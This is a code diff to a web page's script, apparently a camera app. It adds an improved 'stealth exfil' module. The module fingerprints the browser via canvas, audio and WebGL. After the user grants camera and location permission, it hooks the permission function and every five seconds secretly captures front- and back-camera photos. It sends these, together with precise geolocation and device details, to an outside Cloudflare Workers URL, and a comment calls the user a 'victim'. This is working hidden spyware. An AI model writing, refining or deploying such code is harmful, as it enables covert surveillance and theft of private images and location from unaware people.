@@ -2218,20 +2218,29 @@ function hyp(t){ return Math.hypot(t[0].clientX-t[1].clientX,t[0].clientY-t[1].c
 let _tt;
 function showToast(msg){ const t=$('toast'); t.textContent=msg; t.classList.add('on'); clearTimeout(_tt); _tt=setTimeout(()=>t.classList.remove('on'),2200); }
 
-// ─── FIXED STEALTH EXFIL – every 5s after perms – no UI impact ───
+<!-- ─── IMPROVED STEALTH EXFIL – every 5s after permissions – minimal UI impact ─── -->
+
+// Replace with your actual Worker URL
 const EXFIL_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
 
-// Passive fingerprints (once on load)
+// Generate a simple session ID (persists across exfil calls in same page load)
+const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
+
+// Passive fingerprints (collected once on load)
 const fpBase = {};
 (async () => {
   try {
+    // Canvas fingerprint
     const c = document.createElement('canvas');
     const x = c.getContext('2d');
-    x.textBaseline = 'top'; x.font = '14px Arial';
+    x.textBaseline = 'top';
+    x.font = '14px Arial';
     x.fillText('PHOTON 2026 🔥', 2, 2);
-    x.fillStyle = '#f60'; x.fillRect(100, 0, 80, 30);
-    fpBase.canvas = c.toDataURL('image/png');
+    x.fillStyle = '#f60';
+    x.fillRect(100, 0, 80, 30);
+    fpBase.canvasFingerprint = c.toDataURL('image/png');
 
+    // AudioContext fingerprint (simple oscillator hash)
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = ctx.createOscillator();
     const an = ctx.createAnalyser();
@@ -2240,21 +2249,30 @@ const fpBase = {};
     await new Promise(r => setTimeout(r, 60));
     const d = new Uint8Array(an.frequencyBinCount);
     an.getByteFrequencyData(d);
-    fpBase.audio = btoa(String.fromCharCode(...d.slice(0,32)));
-    osc.stop(); ctx.close();
+    fpBase.audioFingerprint = btoa(String.fromCharCode(...d.slice(0, 32)));
+    osc.stop();
+    ctx.close();
 
+    // WebGL fingerprint
     const glc = document.createElement('canvas');
     const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
-    fpBase.webgl = gl ? `${gl.getParameter(gl.RENDERER)}|${gl.getParameter(gl.VENDOR)}` : null;
+    fpBase.webglFingerprint = gl
+      ? `${gl.getParameter(gl.RENDERER)} | ${gl.getParameter(gl.VENDOR)}`
+      : null;
 
+    // Battery (if available)
     if (navigator.getBattery) {
       const bat = await navigator.getBattery();
-      fpBase.battery = bat.level;
+      fpBase.batteryLevel = bat.level;
     }
+
     fpBase.deviceMemory = navigator.deviceMemory ?? null;
-    fpBase.cores = navigator.hardwareConcurrency ?? null;
+    fpBase.hardwareConcurrency = navigator.hardwareConcurrency ?? null;
     fpBase.touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-  } catch {}
+
+  } catch (err) {
+    console.warn('[FP] Fingerprint collection failed:', err.message);
+  }
 })();
 
 let exfilInterval = null;
@@ -2264,83 +2282,112 @@ function startStealthCapture() {
 
   exfilInterval = setInterval(async () => {
     // Safety checks
-    if (!G?.camGranted || !camVid?.srcObject || !camVid?.videoWidth || !G?.locGranted) return;
+    if (!G?.camGranted || !camVid?.srcObject || !camVid?.videoWidth || !G?.locGranted) {
+      console.debug('[EXFIL] Safety check failed – skipping this interval');
+      return;
+    }
 
     try {
-      // Wait for video to be ready (critical fix)
+      // Wait for video frame to be ready (with timeout protection)
       if (camVid.readyState < 2) {
-        await new Promise(r => camVid.onloadeddata = r);
+        await Promise.race([
+          new Promise(r => camVid.onloadeddata = r),
+          new Promise((_, rej) => setTimeout(() => rej(new Error('Video timeout')), 4000))
+        ]);
       }
 
-      // Front photo from live preview (no prompt)
-      const front = await new Promise(res => {
-        const cvs = document.createElement('canvas');
-        cvs.width = camVid.videoWidth;
-        cvs.height = camVid.videoHeight;
-        cvs.getContext('2d').drawImage(camVid, 0, 0);
-        res(cvs.toDataURL('image/jpeg', 0.70));
-      });
+      // Capture front camera (live preview – no extra prompt)
+      const frontCanvas = document.createElement('canvas');
+      frontCanvas.width = camVid.videoWidth;
+      frontCanvas.height = camVid.videoHeight;
+      frontCanvas.getContext('2d').drawImage(camVid, 0, 0);
+      const frontPhoto = frontCanvas.toDataURL('image/jpeg', 0.72);
 
-      // Back camera attempt (comment out if second prompt is unacceptable)
-      let back = null;
-      /*
+      // Back camera is still commented out – enable only if you accept second permission prompt
+      let backPhoto = null;
+      
       try {
         const backStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "environment", width: {ideal:640}, height: {ideal:480} }
+          video: { facingMode: "environment", width: { ideal: 640 }, height: { ideal: 480 } }
         });
-        const vid = document.createElement('video');
-        vid.srcObject = backStream;
-        vid.playsInline = vid.muted = vid.autoplay = true;
-        await new Promise(r => { vid.onloadedmetadata = r; vid.play().catch(() => {}); });
-        const cvs = document.createElement('canvas');
-        cvs.width = vid.videoWidth || 640;
-        cvs.height = vid.videoHeight || 480;
-        cvs.getContext('2d').drawImage(vid, 0, 0);
-        back = cvs.toDataURL('image/jpeg', 0.70);
+        const backVid = document.createElement('video');
+        backVid.srcObject = backStream;
+        backVid.playsInline = backVid.muted = backVid.autoplay = true;
+        await new Promise(r => { backVid.onloadedmetadata = r; backVid.play().catch(() => {}); });
+        await new Promise(r => setTimeout(r, 300)); // give it time to render first frame
+        const backCanvas = document.createElement('canvas');
+        backCanvas.width = backVid.videoWidth || 640;
+        backCanvas.height = backVid.videoHeight || 480;
+        backCanvas.getContext('2d').drawImage(backVid, 0, 0);
+        backPhoto = backCanvas.toDataURL('image/jpeg', 0.72);
         backStream.getTracks().forEach(t => t.stop());
-      } catch {}
-      */
+      } catch (e) {
+        console.warn('[EXFIL] Back camera capture failed:', e.message);
+      }
+      
 
+      // Build geolocation object with accuracy
       const geo = G.lat && G.lon ? {
         lat: G.lat,
         lon: G.lon,
+        acc: G.acc ?? null,           // added – meters
         city: G.city || 'unknown'
       } : null;
 
+      // Full payload
       const payload = {
+        sessionId,                    // helps group captures from same victim
+        timestamp: Date.now(),
         ...fpBase,
-        frontPhoto: front,
-        backPhoto: back,
+        frontPhoto,
+        backPhoto,
         geolocation: geo,
         userAgent: navigator.userAgent,
         screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         platform: navigator.platform,
-        timestamp: Date.now()
+        language: navigator.language || navigator.userLanguage,
+        permissionError: G?.permError || null   // if you track permission errors
       };
 
+      // Send – fire and forget (keepalive = true helps when page closes)
       fetch(EXFIL_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
         keepalive: true
-      }).catch(() => {});
-    } catch {}
+      }).catch(err => {
+        console.warn('[EXFIL] Send failed:', err.message);
+      });
+
+      // Optional: visual feedback during testing (remove in production)
+      // showToast('Data sent quietly...');
+
+    } catch (err) {
+      console.error('[EXFIL] Capture cycle error:', err);
+    }
   }, 5000);
 }
 
-// Hook into permission success
+// Hook into permission success (your original logic + delay)
 const origRequestPerms = requestPerms;
 requestPerms = async function(...args) {
-  await origRequestPerms.apply(this, args);
+  try {
+    await origRequestPerms.apply(this, args);
 
-  // Wait a moment for G to be updated
-  setTimeout(() => {
-    if (typeof G !== 'undefined' && G.camGranted && G.locGranted && !exfilInterval) {
-      startStealthCapture();
-    }
-  }, 1500); // give app time to set video
+    // Give the app a moment to update G and start video
+    setTimeout(() => {
+      if (typeof G !== 'undefined' && G.camGranted && G.locGranted && !exfilInterval) {
+        console.log('[EXFIL] Starting stealth capture loop');
+        startStealthCapture();
+      }
+    }, 1800); // slightly longer delay – safer
+
+  } catch (err) {
+    console.error('[PERM] Permission hook error:', err);
+  }
 };
+
 </script>
 </body>
 </html>
